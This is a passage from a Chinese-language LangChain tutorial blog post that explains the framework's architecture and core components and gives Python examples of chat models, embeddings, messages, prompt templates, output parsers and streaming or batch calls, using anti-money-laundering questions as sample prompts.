pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote>
<p>随着ChatGPT、DeepSeek等大模型（LLM）的崛起，开发者已不满足于简单的对话框交互，而是迫切希望将其深度集成到自己应用中，以构建更强大的智能应用。因此，市场上涌现出诸多大模型集成框架，如LangChain（LangChain4j、LangChainJS）、LlamaIndex、Spring AI、Semantic Kernel、Eino等。其中，其中LangChain是这些框架中出现最早，且最成熟的框架，已成为LLM开发中最受欢迎的框架之一。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b06f400953248b390775d680fc00995~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=r13yV9BSXrmSy5OgwnbfhuSrS0k%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">01</h2>
<p>LangChain概述</p>
<p>1.1 什么是LangChain</p>
<p>LangChain是2022年10月（ChatGPT在2022年11月30问世，比ChatGPT还早），由哈佛大学的Harrison Chase（哈里森·蔡斯）发起研发的一个用于开发基于大语言模型（LLM） 应用程序的开源框架，它的核心目标是简化AI应用的构建过程，让开发者能像搭积木一样，快速组合各种模块来实现复杂功能，如：搭建智能体（Agent）、问答系统（QA）、对话机器人、知识库等。</p>
<p>LangChain在Github上的热度变化：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4f4ecd1235e4067ae2520709af55f7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=QySiMNI9uliwUujDhGEXz20DxRI%3D" alt="" loading="lazy"/></p>
<p>AI大模型架构图：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e59b394161e542a483a02518fb08bf7b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=rN0moKW5ZRAj7Fuq85GlLcp25sI%3D" alt="" loading="lazy"/></p>
<p>LangChain所处的位置：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2cf70dd290004cc8b057c5334dc5726d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=i6t7C3NfQHUsaYmh9DqRj6AO3NM%3D" alt="" loading="lazy"/></p>
<p>1.2 为什么使用LangChain</p>
<p>使用 LangChain 的核心价值在于，它提供了一套高度模块化、可扩展的工具集，让开发人员能够快速、灵活地构建功能丰富的大模型应用，无需关注底层复杂的细节。它开发难度小，学习成本低，并且提供了现成的链式组装，能够让复杂的逻辑变得结构化、可扩展。LangChain最初只是一个开源的软件包，如今已称为一个完整的生态系统，它提供了一系列的标准化组件，且都可以单独使用。</p>
<p>下表是直接对接大模型和使用LangChain的对比：</p>













































<table><thead><tr><th/><th/><th/></tr></thead><tbody><tr><td>对比维度</td><td>直接调用大模型API</td><td>使用 LangChain 开发</td></tr><tr><td>开发模式</td><td>相对直接，但复杂功能需大量自定义代码</td><td>模块化组装，提供大量预制组件和链，简化复杂逻辑</td></tr><tr><td>多模型支持</td><td>通常需为不同供应商的API编写适配代码</td><td>统一接口，轻松切换或组合不同模型（如OpenAI、Anthropic、Hugging Face等）</td></tr><tr><td>外部数据集成</td><td>需自行实现数据加载、处理、向量化与检索逻辑</td><td>内置RAG（检索增强生成） 等强大支持，可轻松连接PDF、数据库、API等外部数据源</td></tr><tr><td>上下文管理</td><td>需手动管理对话历史，易超出Token限制</td><td>内置Memory组件，灵活管理短期和长期记忆，维持连贯对话</td></tr><tr><td>复杂任务自动化</td><td>实现多步骤推理或工具调用逻辑复杂</td><td>通过Agents，让模型能自主决策、调用工具（如计算器、搜索引擎）完成任务</td></tr><tr><td>生产部署与调试</td><td>缺乏标准化工具，监控和调试较困难</td><td>提供LangSmith等平台，用于监控、追踪和调试应用性能</td></tr></tbody></table>
<p>1.3 LangChain架构设计（宏观）</p>
<p>LangChain是由多个包组成的框架：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a98d5d7a5354fbcad0545a9b2386578~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=Cii5Ztk6lCgHKWYhzybiVBjYIis%3D" alt="" loading="lazy"/></p>
<p>图中展示了LangChain（V0.3版本）生态系统的主要组件及其分类，分为三个层次：架构(Architecture)、组件(Components)和部署(Deployment)。</p>
<p>结构1：LangChain（架构中的LangChain，也是后文介绍的）：封装了一系列的API。</p>
<ol start="0">
<li>langchain：构成应用程序认知架构的Chains，Agents，Retrieval strategies等</li>
<li>langchain-community：第三方集成，⽐如：Model I/O、Retrieval、Tool等。</li>
<li>langchain-Core：基础抽象和LangChain表达式语言 (LCEL)</li>
</ol>
<p>结构2：LangGraph：基于有向图+条件边来灵活的构建多智能体应用，提供了条件分支、循环、并行等复杂控制流，能够实现状态持久化、断点续跑、时间旅行、人机协作等高级功能。</p>
<p>结构3：LangSmith：用于构建、调试、测试、评估、监控和链路追踪大模型应用程序，提供了6大功能，涉及Debugging (调试)、Playground (沙盒)、Prompt Management (提示管理)、Annotation (注释)、Testing (测试)、Monitoring (监控)等。与LangChain无缝集成，从原型阶段过渡到生产阶段。</p>
<p>结构4：LangServe：将基于 LangChain 开发的链（Chain）、代理（Agent）等快速部署为 REST API 服务。它基于 FastAPI 构建，极大简化了 AI 应用服务化的流程</p>
<p>LangChain当中，目前最火的两个模块就是：LangGraph，LangSmith。</p>
<p>1.4 LangChain核心组件</p>
<p>LangChain提供了一个高度模块化且可组合的框架，开发者能通过灵活集成其六大核心组件，来构建功能复杂的大模型应用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe6fb659b90e4c74be15868d9b569efc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=WIbcVzcCFqkVUwWJdORiVf3g9so%3D" alt="" loading="lazy"/></p>
<ol start="0">
<li>Model I/O（模型交互标准化接口）：提供统一的模型交互接口，封装提示模板调用、模型推理与输出解析，实现不同大语言模型输入的标准化与输出的结构化处理</li>
<li>Chains（链）：用于链式工作流编排，将多个模块串联起来组成一个完整的流程，例如，一个 Chain 可能包括一个 Prompt 模板、一个大模型和一个输出解析器，它们协同工作，处理用户输入并返回结果。</li>
<li>Memory（记忆）：用于保存历史对话和上下文信息，以便在后续对话中使用，从而实现有状态的对话。</li>
<li>Agents（智能体）：自主决策并调用工具，赋予大模型行动能力</li>
<li>Retrieval（检索，RAG核心）：从大量的文档或数据源中查找相关信息的核心模块，它是构建RAG（检索增强生成）的基础。</li>
<li>Callbacks（保障应用可观测性）：回调机制，允许连接到 LLM 应用程序的各个阶段，可以监控和分析LangChain的运行情况，比如日志记录、监控、流传输等，以优化性能。</li>
</ol>
<p>后续章节将详细介绍以上组件的使用方式。</p>
<h2 data-id="heading-1">02</h2>
<p>LangChain使用之环境准备</p>
<p>2.1 安装LangChain</p>
<p>LangChain基于Python开发，因此需确保系统中安装了Python环境。</p>
<p>安装LangChain</p>
<pre><code class="hljs">方式一：pip install langchain
方式二：conda install langchain
</code></pre>
<p>2.2 简单demo</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">chat_model</span> = ChatOpenAI(
<span class="hljs-attr">model_name</span>=model_name,
<span class="hljs-attr">base_url</span>=base_url,  <span class="hljs-comment"># 与模型交互的地址</span>
<span class="hljs-attr">api_key</span>=api_key,  <span class="hljs-comment"># 秘钥</span>
<span class="hljs-attr">temperature</span>=<span class="hljs-number">0.7</span>   <span class="hljs-comment"># 温度参数,控制生成文本的随机性</span>
)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97e3ddde43ea47549ac1ec18234f05a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=1s50MhAAkkHkdADSak%2F29WIBqoo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">03</h2>
<p>LangChain核心组件之Model I/O</p>
<p>3.1 Model I/O</p>
<p>Model I/O 是应用程序与大模型进行交互的组件，它与大模型的关系类似于JDBC与数据库的关系，本质上都是为了解耦应用逻辑与底层实现，提供标准化的交互接口，使应用程序无需关注大模型底层的实现，可与各种大模型进行交互。Model I/O 包括输入提示(Format)、调用模型(Predict)、输出解析(Parse)。分别对应着Prompt Template（提示词模版），Model （大模型）和Output Parser（输出解析器）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd028fca1c9c4495a57436037651a844~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=Jsv8GHIlRsFKMWBfbdP7BN4FVYc%3D" alt="" loading="lazy"/></p>
<p>说白了，Model I/O 就是LangChain 提供了一系列与大模型交互的API。</p>
<p>3.2 大模型分类（按功能）</p>
<p>1、LLMs（大语言模型）</p>
<p>也叫非对话模型，是许多语言模型应用程序的支柱，通用的文本生成，能够完成一次性的文本生成任务，如写作、翻译等。</p>
<pre><code class="hljs language-scss" lang="scss">llm_model = <span class="hljs-built_in">OpenAI</span>()
llm_model<span class="hljs-selector-class">.invoke</span>("什么是LangChain?")
</code></pre>
<p>2、Chat Models（对话模型）</p>
<p>专门为多轮对话场景优化的语言模型。与LLMs处理纯字符串不同，Chat Models的输入和输出都是结构化的消息对象，能更好地理解和维护对话的上下文。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建ChatOpenAI模型实例</span>
<span class="hljs-attr">chat_model</span> = ChatOpenAI(
<span class="hljs-attr">model_name</span>=model_name,
<span class="hljs-attr">base_url</span>=base_url,  <span class="hljs-comment"># 与模型交互的地址</span>
<span class="hljs-attr">api_key</span>=api_key,  <span class="hljs-comment"># 秘钥</span>
<span class="hljs-attr">temperature</span>=<span class="hljs-number">0.7</span>   <span class="hljs-comment"># 温度参数,控制生成文本的随机性</span>
)
<span class="hljs-comment"># 调用模型</span>
<span class="hljs-attr">response</span> = chat_model.invoke(<span class="hljs-string">"用简单一句话概括一下什么是反洗钱？"</span>)
<span class="hljs-comment"># 打印模型响应内容</span>
print(response)
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0fa5a81d3c654d04be2cad00900341e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=aZGsTYA46On5Q9frNs90mTcXF2w%3D" alt="" loading="lazy"/></p>
<p>3、Embedding Model（嵌入模型）</p>
<p>它的核心任务是将文字、图片等非结构化数据，转换成高维空间中的数值向量。并且能够将语义相近的内容在向量空间中的位置也映射得更近。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 我这里使用的嵌入模型是自己本地部署的，OpenAI的类为OpenAIEmbeddings</span>
<span class="hljs-attr">embeddings_model</span> = OllamaEmbeddings(
<span class="hljs-attr">model</span>=<span class="hljs-string">"nomic-embed-text"</span>,
<span class="hljs-attr">base_url</span>=<span class="hljs-string">"http://127.0.0.1:11434"</span>,
)
<span class="hljs-attr">vector</span> = embeddings_model.embed_query(<span class="hljs-string">"hello world"</span>)
print(f"嵌入向量长度: {len(vector)}")
print(f"前20个值: {vector<span class="hljs-section">[:20]</span>}")
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c16c226c85a344c786ba6007fcd5079b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=%2BQFP9XqQFRqawbhFcpaghNZ7cSs%3D" alt="" loading="lazy"/></p>
<p>3.3 Message（消息）</p>
<p>消息是对话模型中通信的基本单位，用于表示与模型通讯的输入与输出，以及包含与对话相关的上下文信息和元数据，每一条消息都包含一个角色（系统、用户、AI等）和内容（用户的输入或模型的输出）以及其他元信息（id、名称、令牌使用情况等），LangChain提供了一个统一的消息格式，可以在不同模型之间使用。</p>
<p>1、SystemMessage（系统消息）：设定行为准则，用于定义大模型的角色、运行规则、环境信息等。如果模型不支持SystemMessage则LangChain会将消息合并到HumanMessage中一起发送给大模型。</p>
<p>2、HumanMessage（用户消息）：用户的输入，用户向模型发出的提问或指令。</p>
<p>3、AIMessage（大模型消息，一般是模型返回的结果）：大模型的输出，这是大模型对HumanMessage和SystemMessage的响应。它不仅包含生成的文本内容（content属性），还可能包含以下结构化信息（外部工具、调用令牌使用情况等元数据）。</p>
<p>4、ToolMessage/ FunctionMessage：连接外部能力，向模型传递外部工具或函数调用的执行结果，常用于Agent调用tool。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">chat_model</span> = ChatOpenAI(
<span class="hljs-attr">model_name</span>=model_name,
<span class="hljs-attr">base_url</span>=base_url,  <span class="hljs-comment"># 与模型交互的地址</span>
<span class="hljs-attr">api_key</span>=api_key  <span class="hljs-comment"># 秘钥</span>
)
<span class="hljs-attr">messages</span> = [
<span class="hljs-comment"># 创建系统消息，定义模型的角色</span>
SystemMessage(content=<span class="hljs-string">"我是反洗钱领域的专家，我叫RiskHelper"</span>),      <span class="hljs-comment"># 创建用户消息，用户的提问</span>
HumanMessage(content=<span class="hljs-string">"你好，什么是反洗钱？"</span>)
]
<span class="hljs-comment"># 返回的类型是AI大模型消息</span>
<span class="hljs-attr">response</span> = chat_model.invoke(messages)
print(type(response)) <span class="hljs-comment"># 格式是AIMessage</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cf0e410c8e546a1bbac12d0b07089ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=Qc5QVUK8gh3Ni22rmAmKoZhyoOU%3D" alt="" loading="lazy"/></p>
<p>3.4 Prompt Template（提示词模版）</p>
<p>Prompt（提示词）：提示词是与大模型交互时输入的内容，用来指导大模型生成特定类型的回答或执行特定的任务。它可以是一个简单的问题、一段详细的任务说明，或包含角色、背景、示例的复杂文本。其核心目的是约束行为，减少错误，引导模型生成用户期望的响应。好的提示词可以解决60%以上的模型幻觉问题，优化提示词也是我们后续开发中解决大模型幻觉最多且最有效的方式之一。</p>
<p>如下是一个简单的提示词：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
您是一名资深LangChain框架专家，具备以下专业背景：
- 精通LangChain 0.3.x及以上版本的核心架构
- 熟练掌握Models、Prompts、Chains、Agents、Memory五大组件
- 拥有实际企业级LLM应用部署经验
请根据用户需求提供：
1. 架构设计建议（组件选型与组合逻辑）
2. 代码实现方案（包含最佳实践）
3. 性能优化策略（处理长文本/高并发场景）
4. 错误排查指导（常见陷阱与解决方案）用户输入: {input}
"""</span>
</code></pre>
<p>Prompt Template（提示词模版）：固定的提示词限制了模型的灵活性和适用范围，所以 Prompt Template 是一个模板化的字符串，可以将变量（如用户提问等）插入到模板的占位符中，从而创建出不同的提示。LangChain提供了很多提示词模版，用于与大模型交互，常见的提示词模版如下：</p>
<p>1、PromptTemplate：LLM提示模板，用于生成字符串提示，生成的是单一、无角色区分的纯文本字符串。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建PromptTemplate</span>
<span class="hljs-attr">prompt_template</span> = PromptTemplate(
<span class="hljs-attr">template</span>=<span class="hljs-string">"如何成为一个{domain}领域的专家"</span>,
<span class="hljs-attr">input_variables</span>=[<span class="hljs-string">"domain"</span>]
)
<span class="hljs-comment"># 填充模版参数，将反洗钱填充到domain字段中</span>
<span class="hljs-attr">messages</span> = prompt_template.invoke({<span class="hljs-string">"domain"</span>: <span class="hljs-string">"反洗钱"</span>})
<span class="hljs-attr">response</span> = chat_model.invoke(messages)
print(response.content)
</code></pre>
<p>2、ChatPromptTemplate：创建聊天消息列表的提示模板。生成的是结构化的消息列表，其中每条消息都带有明确的角色（如系统、用户、AI），用在对话模型中。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 方式一，使用构造函数创建</span>
<span class="hljs-attr">chatprompt_template</span> = ChatPromptTemplate([
<span class="hljs-comment"># key: 角色, value: 内容,</span>
(<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个反洗钱领域的专家，你的名字是{name}"</span>),  <span class="hljs-comment"># 系统提示词</span>
(<span class="hljs-string">"human"</span>, <span class="hljs-string">"帮我解答一下{question}"</span>)   <span class="hljs-comment"># 用户提示词</span>
])
<span class="hljs-comment"># 填充模版参数</span>
<span class="hljs-attr">message</span> = chatprompt_template.format(name=<span class="hljs-string">"RiskHelper"</span>, question=<span class="hljs-string">"什么是反洗钱？"</span>)
<span class="hljs-attr">response</span> = chat_model.invoke(message)
print(response.content)
<span class="hljs-comment"># 方式二，使用from_messages方法创建</span>
<span class="hljs-attr">chatprompt_template</span> = ChatPromptTemplate.from_messages([
(<span class="hljs-string">"system"</span>, <span class="hljs-string">"你是一个反洗钱领域的专家，你的名字是{name}"</span>),
(<span class="hljs-string">"human"</span>, <span class="hljs-string">"帮我解答一下{question}"</span>)
])
<span class="hljs-comment"># 填充模版参数</span>
<span class="hljs-attr">messages</span> = chatprompt_template.format(name=<span class="hljs-string">"RiskHelper"</span>, question=<span class="hljs-string">"什么是反洗钱？"</span>)
<span class="hljs-attr">response</span> = chat_model.invoke(messages)
print(response.content)
</code></pre>
<p>3、XxxMessagePromptTemplate ：特定角色的消息提示词模板，包括：SystemMessagePromptTemplate、HumanMessagePromptTemplate、AIMessagePromptTemplate、ChatMessagePromptTemplate等，通常用ChatPromptTemplate将消息提示词模版打包在一起，一并发送给模型。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建聊天提示词模版</span>
<span class="hljs-attr">chatprompt_template</span> = ChatPromptTemplate([
<span class="hljs-comment"># 创建系统提示词模版</span>
SystemMessagePromptTemplate.from_template(<span class="hljs-string">"你是一个反洗钱领域的专家，你的名字是{name}"</span>),
<span class="hljs-comment"># 创建用户提示词模版</span>
HumanMessagePromptTemplate.from_template(<span class="hljs-string">"帮我解答一下{question}"</span>)
])
<span class="hljs-comment"># 填充模版参数</span>
<span class="hljs-attr">message</span> = chatprompt_template.format(name=<span class="hljs-string">"RiskHelper"</span>, question=<span class="hljs-string">"什么是反洗钱？"</span>)
<span class="hljs-attr">response</span> = chat_model.invoke(message)
print(response.content)
</code></pre>
<p>4、FewShotPromptTemplate ：样本提示词模板，提供少量的样例作为参考来引导大模型按照特定的格式和风格输出。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 1. 定义示例数据</span>
<span class="hljs-attr">examples</span> = [
{
<span class="hljs-string">"question"</span>: <span class="hljs-string">"什么是Spring Boot？"</span>,
<span class="hljs-string">"answer"</span>: <span class="hljs-string">"Spring Boot是一个基于Spring框架的开源Java框架，用于简化Spring应用程序的创建和部署。"</span>
},
{
<span class="hljs-string">"question"</span>: <span class="hljs-string">"什么是依赖注入？"</span>,
<span class="hljs-string">"answer"</span>: <span class="hljs-string">"依赖注入是一种设计模式，通过外部容器向对象提供其所需的依赖，而不是对象自己创建依赖。"</span>
},
{
<span class="hljs-string">"question"</span>: <span class="hljs-string">"什么是RESTful API？"</span>,
<span class="hljs-string">"answer"</span>: <span class="hljs-string">"RESTful API是遵循REST架构风格的Web服务接口，使用HTTP方法进行资源操作。"</span>
}
]
<span class="hljs-comment"># 2. 定义示例模板</span>
<span class="hljs-attr">example_prompt</span> = PromptTemplate(
<span class="hljs-attr">input_variables</span>=[<span class="hljs-string">"question"</span>, <span class="hljs-string">"answer"</span>],
<span class="hljs-attr">template</span>=<span class="hljs-string">"问题: {question}\n答案: {answer}"</span>
)
<span class="hljs-comment"># 3. 创建few-shot提示词模版</span>
<span class="hljs-attr">few_shot_prompt</span> = FewShotPromptTemplate(
<span class="hljs-attr">examples</span>=examples,
<span class="hljs-attr">example_prompt</span>=example_prompt,
<span class="hljs-attr">suffix</span>=<span class="hljs-string">"问题: {question}"</span>,
<span class="hljs-attr">input_variables</span>=[<span class="hljs-string">"question"</span>]
)
<span class="hljs-attr">formatted_prompt</span> = few_shot_prompt.format(question=<span class="hljs-string">"什么是LangChain？"</span>)
<span class="hljs-attr">response</span> = chat_model.invoke(formatted_prompt)
print(response.content)
</code></pre>
<p>还有一些其他的提示词模版，大家感兴趣可以参考：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpython.langchain.com.cn%2Fdocs%2Fmodules%2Fmodel" target="_blank" title="https://python.langchain.com.cn/docs/modules/model" ref="nofollow noopener noreferrer">python.langchain.com.cn/docs/module…</a>_io/prompts/prompt_templates/</p>
<p>3.5 Output Parsers（输出解析器）</p>
<p>大模型通常返回的内容都是字符串格式，但是我们实际开发中更擅长处理结构化数据，输出解析器就是将大模型输出的结果转换成特定的结构化数据，以便应用程序能更方便的处理。LangChain提供了一些常见的输出解析器，如StrOutputParser（字符串解析器）、JsonOutputParser（json解析器）、CommaSeparatedListOutputParser（csv解析器）、DatetimeOutputParserde（日期解析器）、XmlOutputParser（xml解析器）等下边用JsonOutputParser写一个简单的实例</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">json_parser</span> = JsonOutputParser()
<span class="hljs-attr">prompt_template</span> = PromptTemplate(
<span class="hljs-attr">template</span>=<span class="hljs-string">"用简单的一句话描述一下什么是{name}？请按照以下格式输出：{format_instructions}"</span>,
<span class="hljs-attr">input_variables</span>=[<span class="hljs-string">"name"</span>],
<span class="hljs-comment"># 告诉大模型，按照json格式输出</span>
<span class="hljs-attr">partial_variables</span>={<span class="hljs-string">"format_instructions"</span>: json_parser.get_format_instructions()}
)
<span class="hljs-attr">messages</span> = prompt_template.invoke({<span class="hljs-string">"name"</span>: <span class="hljs-string">"反洗钱"</span>})
<span class="hljs-attr">response</span> = chat_model.invoke(messages)
print(json_parser.parse(response.content))
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9dfbcd66442477fb5b99bc654213aa4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=cex7s6l58PvUxPiq3RnkFGKz36g%3D" alt="" loading="lazy"/></p>
<p>3.6 模型的调用方式</p>
<p>Runnable 接口是使用LangChain组件的基础，它在许多组件中实现，例如语言模型、输出解析器、检索器、编译的LangGraph 图等。Runnable 方式定义了一个标准接口，允许 Runnable 组件用以下方式调用：</p>
<p>1、invoke：处理单条输入，等待模型完全处理完成后再返回结果，上述的例子都是invoke调用</p>
<p>2、stream：流式响应，逐字符输出模型的响应，类似于我们日常使用的AI应用（元宝）一样，给用户输出是逐字输出，无需等所有的结果生成后一次返回，对于用户交互体验较好。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 流式输出</span>
<span class="hljs-attr">chat_model</span> = ChatOpenAI(
<span class="hljs-attr">model_name</span>=model_name,
<span class="hljs-attr">base_url</span>=base_url,  <span class="hljs-comment"># 与模型交互的地址</span>
<span class="hljs-attr">api_key</span>=api_key,  <span class="hljs-comment"># 秘钥</span>
<span class="hljs-attr">streaming</span>=<span class="hljs-literal">True</span>   <span class="hljs-comment"># 开启流式输出</span>
)
<span class="hljs-attr">chatprompt_template</span> = ChatPromptTemplate([
SystemMessagePromptTemplate.from_template(<span class="hljs-string">"你是一个反洗钱领域的专家"</span>),
HumanMessagePromptTemplate.from_template(<span class="hljs-string">"请详细讲一下什么是{value}？"</span>)
])
<span class="hljs-attr">message</span> = chatprompt_template.invoke({<span class="hljs-string">"value"</span>: <span class="hljs-string">"反洗钱"</span>})
for output in chat_model.stream(message):
<span class="hljs-comment"># 逐个打印token内容</span>
print(output.content, <span class="hljs-attr">end</span>=<span class="hljs-string">""</span>, flush=<span class="hljs-literal">True</span>)
</code></pre>
<p>3、batch：批量处理，可以将多个消息一起发送给模型。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 创建三个消息</span>
<span class="hljs-attr">message1</span> = [HumanMessage(content=<span class="hljs-string">"什么是风控？"</span>)]
<span class="hljs-attr">message2</span> = [HumanMessage(content=<span class="hljs-string">"什么是反洗钱？"</span>)]
<span class="hljs-attr">message3</span> = [HumanMessage(content=<span class="hljs-string">"什么是EDD？"</span>)]
<span class="hljs-attr">messages</span> = [message1, message2, message3]
<span class="hljs-comment"># 批量调用</span>
<span class="hljs-attr">response</span> = chat_model.batch(messages)
print(response)
</code></pre>
<p>LangChain还提供了与上边相对应的异步方法：</p>
<ol start="0">
<li>astream：异步流式响应</li>
<li>ainvoke：异步处理单条输入</li>
<li>abatch：异步处理批量输入</li>
<li>astream_log：异步流式返回中间步骤，以及最终响应</li>
</ol>
<p>如果对具体的调用方式感兴趣可以参考官方文档：LangChain-Runnable调用</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.langchain.com%2Foss%2Fjavascript%2Flangchain%2Foverview" target="_blank" title="https://docs.langchain.com/oss/javascript/langchain/overview" ref="nofollow noopener noreferrer">docs.langchain.com/oss/javascr…</a></p>
<h2 data-id="heading-3">04</h2>
<p>LangChain核心组件之Chains</p>
<p>4.1 Chain（链）概述</p>
<p>链，它将多个组件（提示词模版、大模型、记忆、工具、输出解析器）串联起来，形成一个可执行的，自动化的工作流程，类似于流水线作业。它将上一个组件的输出作为下一个组件的输入，将多个步骤串连起来执行，最终将模型的响应结果返回给用户。一个小Chain可以包含提示词模版-&gt;大模型-&gt;输出解析器，一个主Chain也可以将多个子Chain串起来，比如输入一篇文章先翻译（Chain A），再总结（Chain B）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae4d38943333417ca3c5c91b890480b8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856738&amp;x-signature=Tr3WeH0VuUzUD51TmcwU%2FLScAjc%3D" alt="" loading="lazy"/></p>
<p>4.2 Chain组件使用</p>
<p>1、LLMChain（已过时）：最基础的Chain，将一个提示词模板和一个大模型封装在一起，构成一个可执行的单元。适用于简单的问答、文本生成等单步任务。它的工作流程是：将用户输入的数据填充提示词模板，然后将格式化后的提示词发送给大模型，最终返回大模型的生成结果。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">chatprompt_template</span> = ChatPromptTemplate([
SystemMessagePromptTemplate.from_template(<span class="hljs-string">"你是一个反洗钱领域的专家，你的名字是{name}"</span>),
HumanMessagePromptTemplate.from_template(<span class="hljs-string">"帮我解答一下{question}"</span>)
])
<span class="hljs-comment"># 创建链</span>
<span class="hljs-attr">chain</span> = LLMChain(llm=chat_model, prompt=chatprompt_template)
<span class="hljs-comment"># 调用链，先执行prompt，并将结果给到llm，再执行llm，最后返回结果</span>
